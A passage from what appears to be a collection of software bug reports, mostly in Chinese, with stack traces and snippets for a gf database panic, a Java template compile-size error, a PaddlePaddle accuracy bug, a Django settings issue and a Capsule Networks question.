-0.22302914 0.03456648 E 0.23178323 0.12827837 0.03671292 -0.01634123 0.23442744 0.01437876 E -0.01369774 -0.04909075 0.19198845 0.16255982 0.29794276 -0.03312268 E 0.19846116 0.34069946 -0.08241715 0.02185924 -0.03032037 0.14696574 E 0.21670783 -0.05860339 -0.13220927 -0.11785416 -0.0379169 0.06794775 E -0.07148692 -0.13274194 0.14876033 0.29946527 0.00995167 -0.3659759 E -0.23311865 -0.38561928 0.16395426 0.27795938 -0.12796694 0.26761442 E 0.02077716 0.2131021 -0.19519076 -0.07360688 0.11917628 0.01247738 E -0.05916881 -0.35346037 -0.09084733 0.00562126 0.13968773 -0.1986531 E -0.18095423 0.11246888 0.2139754 0.00329455 -0.1263564 -0.12079865 E 0.03054008 -0.0606503 0.08069512 -0.19708657 0.12726188 0.3219813 E -0.09387415 -0.01241911 0.4593275 -0.493772 0.593678 -0.14479764 E 0.0970514 -0.05651075 0.1413509 -0.0239793 -0.1301438 -0.11869805 E 0.03133599 -0.1671956 0.12437611 -0.05950696 0.133756 0.36773783 E 0.06147557 -0.07821971 -0.10179609 0.01625529 -0.25826 -0.12562357 E 0.20168379 0.07932878 -0.3356204 -0.1142972 0.0547028 -0.12918946 E -0.05513413 -0.10435084] E data_me_error:[-0.16360566 0.17494443 0.01490632 0.05205098 0.23724078 -0.12765637 E 0.04242279 0.16206232 0.01081585 0.09022838 -0.1767876 -0.00593348 E 0.20806457 0.1476576 0.1795575 -0.12331474 -0.1615987 0.20960388 E 0.18726604 0.08946185 -0.05565919 0.23001835 -0.01237184 -0.10276236 E -0.12565878 0.19972336 -0.1949145 -0.12891038 -0.22884068 0.20379569 E -0.10093413 -0.09717382 0.09217925 0.04005703 0.22302902 -0.03456662 E -0.23178315 -0.12827839 -0.03671286 0.01634115 -0.23442744 -0.01437869 E 0.01369798 0.04909041 -0.19198848 -0.16255984 -0.29794246 0.0331229 E -0.19846116 -0.34069952 0.08241718 -0.0218593 0.0303204 -0.14696574 E -0.2167075 0.05860357 0.13220926 0.11785417 0.03791662 -0.06794772 E 0.07148699 0.13274181 -0.14876075 -0.29946506 -0.0099518 0.36597595 E 0.2331192 0.3856189 -0.16395429 -0.2779594 0.12796706 -0.26761442 E -0.02077717 -0.21310198 0.1951908 0.07360712 -0.11917627 -0.01247736 E 0.05916902 0.35346058 0.09084737 -0.00562128 -0.13968739 0.19865309 E 0.18095414 -0.11246888 -0.21397546 -0.00329419 0.12635641 0.12079879 E -0.03053979 0.06065004 -0.08069508 0.1970865 -0.12726225 -0.3219812 E 0.09387415 0.01241922 -0.4593275 0.4937724 -0.59367806 0.1447976 E -0.09705144 0.05651084 -0.14135092 0.0239794 0.13014384 0.11869811 E -0.03133597 0.16719559 -0.12437607 0.05950708 -0.13375601 -0.3677378 E -0.06147537 0.07821967 0.10179602 -0.01625527 0.2582603 0.1256233 E -0.20168376 -0.07932854 0.33562043 0.11429681 -0.05470276 0.12918957 E 0.05513417 0.10435086] E loss:[0.32721138 0.3498888 0.02981262 0.10410231 0.47448158 0.25531277 E 0.08484546 0.3241245 0.0216317 0.18045679 0.3535754 0.01186715 E 0.4161291 0.29531527 0.35911497 0.24662912 0.32319742 0.41920763 E 0.3745324 0.17892386 0.11131848 0.4600367 0.02474384 0.2055247 E 0.25131756 0.3994467 0.38982886 0.25782067 0.45768142 0.4075913 E 0.20186809 0.19434759 0.1843585 0.08011404 0.44605815 0.0691331 E 0.46356636 0.25655675 0.07342578 0.03268238 0.46885487 0.02875745 E 0.02739573 0.09818116 0.38397694 0.32511967 0.5958852 0.06624559 E 0.39692232 0.681399 0.16483432 0.04371854 0.06064077 0.29393148 E 0.43341532 0.11720695 0.26441854 0.23570833 0.07583351 0.13589546 E 0.1429739 0.26548374 0.29752108 0.59893036 0.01990348 0.73195183 E 0.46623784 0.7712382 0.32790855 0.5559188 0.255934 0.53522885 E 0.04155433 0.4262041 0.39038157 0.147214 0.23835255 0.02495474 E 0.11833782 0.706921 0.1816947 0.01124254 0.27937514 0.3973062 E 0.36190838 0.22493777 0.42795086 0.00658875 0.2527128 0.24159744 E 0.06107987 0.12130034 0.1613902 0.3941731 0.2545241 0.6439625 E 0.1877483 0.02483834 0.918655 0.9875444 1.187356 0.28959525 E 0.19410285 0.11302158 0.28270182 0.04795869 0.26028764 0.23739615 E 0.06267197 0.33439118 0.24875218 0.11901404 0.26751202 0.73547566 E 0.12295094 0.15643938 0.2035921 0.03251056 0.5165203 0.25124687 E 0.40336755 0.15865731 0.6712408 0.228594 0.10940556 0.25837904 E 0.11026829 0.2087017 ] ../share/utils.py:24: AssertionError"
"gf的gdb模块发生错误,结果转换发生panic错误","错误详情 发生错误的代码 错误发生在r.String()那一行代码   <code>: /home/wwg/software/golang/go/src/runtime/panic.go:513 +0x1b9 gitee.com/johng/gf/g/container/gvar.(*Var).Val(...) /home/wwg/software/golang/gopath/pkg/mod/gitee.com/johng/gf@v1.0.898/g/container/gvar/gvar.go:42 gitee.com/johng/gf/g/container/gvar.(*Var).String(0x0, 0x0, 0x0) /home/wwg/software/golang/gopath/pkg/mod/gitee.com/johng/gf@v1.0.898/g/container/gvar/gvar.go:55 +0x2e vector/smartstore/src/core/pt/network/socket/model.GetBoxEventInfo(0xc00035cce8, 0x8, 0x1, 0x11, 0x0, 0x0, 0x0, 0x0) /home/wwg/mydata/data/go/smartstore/src/core/pt/network/socket/model/model.go:213 +0x4c9 vector/smartstore/src/core/pt/network/packethandle.infoCommand(0xc00035cce8, 0x8, 0xc00036c592, 0x3, 0xe, 0x8, 0xc0000a8060, 0xc000684000) if r, err := db.Table(""`event` ev""). InnerJoin(""police po"", ""ev.used = po.po_id""). InnerJoin(""certificate ce"", ""po.ce_id = ce.ce_id""). InnerJoin(""certposition cp"", ""cp.ce_id = ce.ce_id""). InnerJoin(""control ct"", ""cp.co_id = ct.co_id""). InnerJoin(""store st"", ""st.co_id = ct.co_id AND cp.se_id = st.se_id""). InnerJoin(""box bo"", ""bo.se_id = st.se_id AND cp.bo_id = bo.bo_id""). Fields(""ev.e_id AS eid""). Where(""ct.hardwarecode=?"", hardware). And(""st.number=?"", stnumber). And(""bo.boxnumber=?"", boxnumber). And(""ev.status &lt;&gt; ?"", ""remand""). Value(); err == nil { return r.String(), nil } else { return """", fmt.Errorf(""执行出错"") }"
"The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit","RT。 场景： 一个page文件中引入两个page。其中一个page文件有102k。 三个page总大小在120k多。出现如下异常： -216399 [360522375@qtp-144005940-4] ERROR - java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) Caused by: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) -216400 [360522375@qtp-144005940-4] ERROR - 执行WebContext处理流程时出现异常，原因：tiny template render error; nested exception is org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) org.springframework.web.util.NestedServletException: tiny template render error; nested exception is org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) Caused by: org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) Caused by: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) -216401 [360522375@qtp-144005940-4] ERROR - Full stack trace of the error RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) org.springframework.web.util.NestedServletException: tiny template render error; nested exception is org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) Caused by: org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) Caused by: java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s) [ERROR] /tinyuiweb/page/3.7-icon.page java.lang.RuntimeException: Compilation failed. The code of method renderContent(TemplateContext, Writer) is exceeding the 65535 bytes limit 10: addImport(""/components/icon.component""); 11: } 12: protected void renderContent(TemplateContext $context, Writer $writer) throws IOException, TemplateException{ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 1 error(s)   <code>: at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:102) at org.tinygroup.template.loader.FileObjectResourceLoader.createTemplate(FileObjectResourceLoader.java:52) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplateItem(FileObjectResourceLoader.java:58) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplateItem(AbstractResourceLoader.java:95) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplate(AbstractResourceLoader.java:86) at org.tinygroup.template.impl.TemplateEngineDefault.findTemplate(TemplateEngineDefault.java:214) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplateWithOutLayout(TemplateEngineDefault.java:285) at page.T3_7_icon_page.renderContent(T3_7_icon_page.java:22) at org.tinygroup.template.impl.AbstractTemplate.render(AbstractTemplate.java:69) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplate(TemplateEngineDefault.java:256) at org.tinygroup.templateweb.TinyTemplateProcessor.reallyProcess(TinyTemplateProcessor.java:65) at org.tinygroup.weblayer.AbstractTinyProcessor.process(AbstractTinyProcessor.java:67) at org.tinygroup.weblayer.impl.TinyProcessorManagerImpl.execute(TinyProcessorManagerImpl.java:67) at org.tinygroup.weblayer.TinyFilterHandler.tinyFilterProcessor(TinyFilterHandler.java:99) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:62) at org.tinygroup.weblayer.filter.gzip.GZIPFilter.doFilter(GZIPFilter.java:54) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:59) at org.tinygroup.weblayer.impl.TinyFilterWrapper.filterWrapper(TinyFilterWrapper.java:76) at org.tinygroup.weblayer.TinyHttpFilter.doFilter(TinyHttpFilter.java:142) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1212) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:399) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:766) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:450) at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:230) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) at org.mortbay.jetty.Server.handle(Server.java:326) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:928) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:549) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:212) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:410) at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582) at org.tinygroup.template.compiler.MemorySourceCompiler$CompilerRequestor.acceptResult(MemorySourceCompiler.java:417) at org.eclipse.jdt.internal.compiler.Compiler.handleInternalException(Compiler.java:678) at org.eclipse.jdt.internal.compiler.Compiler.compile(Compiler.java:522) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:233) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:191) at org.tinygroup.template.compiler.MemorySourceCompiler.loadClass(MemorySourceCompiler.java:50) at org.tinygroup.template.loader.ResourceCompilerUtils.compileResource(ResourceCompilerUtils.java:59) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:98) ... 35 more at org.tinygroup.templateweb.TinyTemplateProcessor.reallyProcess(TinyTemplateProcessor.java:73) at org.tinygroup.weblayer.AbstractTinyProcessor.process(AbstractTinyProcessor.java:67) at org.tinygroup.weblayer.impl.TinyProcessorManagerImpl.execute(TinyProcessorManagerImpl.java:67) at org.tinygroup.weblayer.TinyFilterHandler.tinyFilterProcessor(TinyFilterHandler.java:99) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:62) at org.tinygroup.weblayer.filter.gzip.GZIPFilter.doFilter(GZIPFilter.java:54) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:59) at org.tinygroup.weblayer.impl.TinyFilterWrapper.filterWrapper(TinyFilterWrapper.java:76) at org.tinygroup.weblayer.TinyHttpFilter.doFilter(TinyHttpFilter.java:142) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1212) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:399) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:766) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:450) at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:230) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) at org.mortbay.jetty.Server.handle(Server.java:326) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:928) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:549) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:212) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:410) at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:102) at org.tinygroup.template.loader.FileObjectResourceLoader.createTemplate(FileObjectResourceLoader.java:52) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplateItem(FileObjectResourceLoader.java:58) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplateItem(AbstractResourceLoader.java:95) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplate(AbstractResourceLoader.java:86) at org.tinygroup.template.impl.TemplateEngineDefault.findTemplate(TemplateEngineDefault.java:214) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplateWithOutLayout(TemplateEngineDefault.java:285) at page.T3_7_icon_page.renderContent(T3_7_icon_page.java:22) at org.tinygroup.template.impl.AbstractTemplate.render(AbstractTemplate.java:69) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplate(TemplateEngineDefault.java:256) at org.tinygroup.templateweb.TinyTemplateProcessor.reallyProcess(TinyTemplateProcessor.java:65) ... 25 more at org.tinygroup.template.compiler.MemorySourceCompiler$CompilerRequestor.acceptResult(MemorySourceCompiler.java:417) at org.eclipse.jdt.internal.compiler.Compiler.handleInternalException(Compiler.java:678) at org.eclipse.jdt.internal.compiler.Compiler.compile(Compiler.java:522) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:233) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:191) at org.tinygroup.template.compiler.MemorySourceCompiler.loadClass(MemorySourceCompiler.java:50) at org.tinygroup.template.loader.ResourceCompilerUtils.compileResource(ResourceCompilerUtils.java:59) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:98) ... 35 more at org.tinygroup.templateweb.TinyTemplateProcessor.reallyProcess(TinyTemplateProcessor.java:73) at org.tinygroup.weblayer.AbstractTinyProcessor.process(AbstractTinyProcessor.java:67) at org.tinygroup.weblayer.impl.TinyProcessorManagerImpl.execute(TinyProcessorManagerImpl.java:67) at org.tinygroup.weblayer.TinyFilterHandler.tinyFilterProcessor(TinyFilterHandler.java:99) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:62) at org.tinygroup.weblayer.filter.gzip.GZIPFilter.doFilter(GZIPFilter.java:54) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:59) at org.tinygroup.weblayer.impl.TinyFilterWrapper.filterWrapper(TinyFilterWrapper.java:76) at org.tinygroup.weblayer.TinyHttpFilter.doFilter(TinyHttpFilter.java:142) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1212) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:399) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:766) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:450) at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:230) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) at org.mortbay.jetty.Server.handle(Server.java:326) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:928) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:549) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:212) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:410) at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:102) at org.tinygroup.template.loader.FileObjectResourceLoader.createTemplate(FileObjectResourceLoader.java:52) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplateItem(FileObjectResourceLoader.java:58) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplateItem(AbstractResourceLoader.java:95) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplate(AbstractResourceLoader.java:86) at org.tinygroup.template.impl.TemplateEngineDefault.findTemplate(TemplateEngineDefault.java:214) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplateWithOutLayout(TemplateEngineDefault.java:285) at page.T3_7_icon_page.renderContent(T3_7_icon_page.java:22) at org.tinygroup.template.impl.AbstractTemplate.render(AbstractTemplate.java:69) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplate(TemplateEngineDefault.java:256) at org.tinygroup.templateweb.TinyTemplateProcessor.reallyProcess(TinyTemplateProcessor.java:65) ... 25 more at org.tinygroup.template.compiler.MemorySourceCompiler$CompilerRequestor.acceptResult(MemorySourceCompiler.java:417) at org.eclipse.jdt.internal.compiler.Compiler.handleInternalException(Compiler.java:678) at org.eclipse.jdt.internal.compiler.Compiler.compile(Compiler.java:522) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:233) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:191) at org.tinygroup.template.compiler.MemorySourceCompiler.loadClass(MemorySourceCompiler.java:50) at org.tinygroup.template.loader.ResourceCompilerUtils.compileResource(ResourceCompilerUtils.java:59) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:98) ... 35 more at org.tinygroup.template.compiler.MemorySourceCompiler$CompilerRequestor.acceptResult(MemorySourceCompiler.java:417) at org.eclipse.jdt.internal.compiler.Compiler.handleInternalException(Compiler.java:678) at org.eclipse.jdt.internal.compiler.Compiler.compile(Compiler.java:522) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:233) at org.tinygroup.template.compiler.MemorySourceCompiler.compile(MemorySourceCompiler.java:191) at org.tinygroup.template.compiler.MemorySourceCompiler.loadClass(MemorySourceCompiler.java:50) at org.tinygroup.template.loader.ResourceCompilerUtils.compileResource(ResourceCompilerUtils.java:59) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:98) at org.tinygroup.template.loader.FileObjectResourceLoader.createTemplate(FileObjectResourceLoader.java:52) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplateItem(FileObjectResourceLoader.java:58) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplateItem(AbstractResourceLoader.java:95) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplate(AbstractResourceLoader.java:86) at org.tinygroup.template.impl.TemplateEngineDefault.findTemplate(TemplateEngineDefault.java:214) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplateWithOutLayout(TemplateEngineDefault.java:285) at page.T3_7_icon_page.renderContent(T3_7_icon_page.java:22) at org.tinygroup.template.impl.AbstractTemplate.render(AbstractTemplate.java:69) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplate(TemplateEngineDefault.java:256) at org.tinygroup.templateweb.TinyTemplateProcessor.reallyProcess(TinyTemplateProcessor.java:65) at org.tinygroup.weblayer.AbstractTinyProcessor.process(AbstractTinyProcessor.java:67) at org.tinygroup.weblayer.impl.TinyProcessorManagerImpl.execute(TinyProcessorManagerImpl.java:67) at org.tinygroup.weblayer.TinyFilterHandler.tinyFilterProcessor(TinyFilterHandler.java:99) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:62) at org.tinygroup.weblayer.filter.gzip.GZIPFilter.doFilter(GZIPFilter.java:54) at org.tinygroup.weblayer.impl.TinyFilterChain.doFilter(TinyFilterChain.java:59) at org.tinygroup.weblayer.impl.TinyFilterWrapper.filterWrapper(TinyFilterWrapper.java:76) at org.tinygroup.weblayer.TinyHttpFilter.doFilter(TinyHttpFilter.java:142) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1212) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:399) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:766) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:450) at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:230) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) at org.mortbay.jetty.Server.handle(Server.java:326) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:928) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:549) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:212) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:410) at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582)"
BUG: fluid.layers.accuracy not work correctly,"现在accuracy的实现方法，是对input沿行方向取argmax后，取得最大概率下标，与稠密的label进行比对。 但当input的类别维度为1时，argmax结果显然恒为0。因此accuracy的取值将由label中0的占比来决定，而不是真正的“正确率” 可见目前的实现: 如果输入的是一个形如(bs, 1)的二分类模型输出时，显然topk输出结果恒为0，导致之后的准确率计算逻辑无意义 建议修复方案： 增加逻辑判断   <code>: def accuracy(input, label, k=1, correct=None, total=None): ...... topk_out, topk_indices = nn.topk(input, k=k) # Bug!!! acc_out = helper.create_variable_for_type_inference(dtype=""float32"") input def accuracy(input, label, k=1, correct=None, total=None): ...... if input.shape[1] == 1: do something. else: topk_out, topk_indices = nn.topk(input, k=k) acc_out = helper.create_variable_for_type_inference(dtype=""float32"")"
在 settings.py 文件中的 STATIC_URL = '/static/' 下面有一个bug,settings.py 文件中，后面的代码有一段判断 DEBUG 的代码，只要启用了DEBUG，就会出现和下面的STATIC有关的500错误，原因还没找到，希望作者尽快修复这个bug   <code>: STATIC_URL = '/static/'
PaddlePaddle Test for Capsule Networks -- Is there a support for latest Python 3 and other libraries already?,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
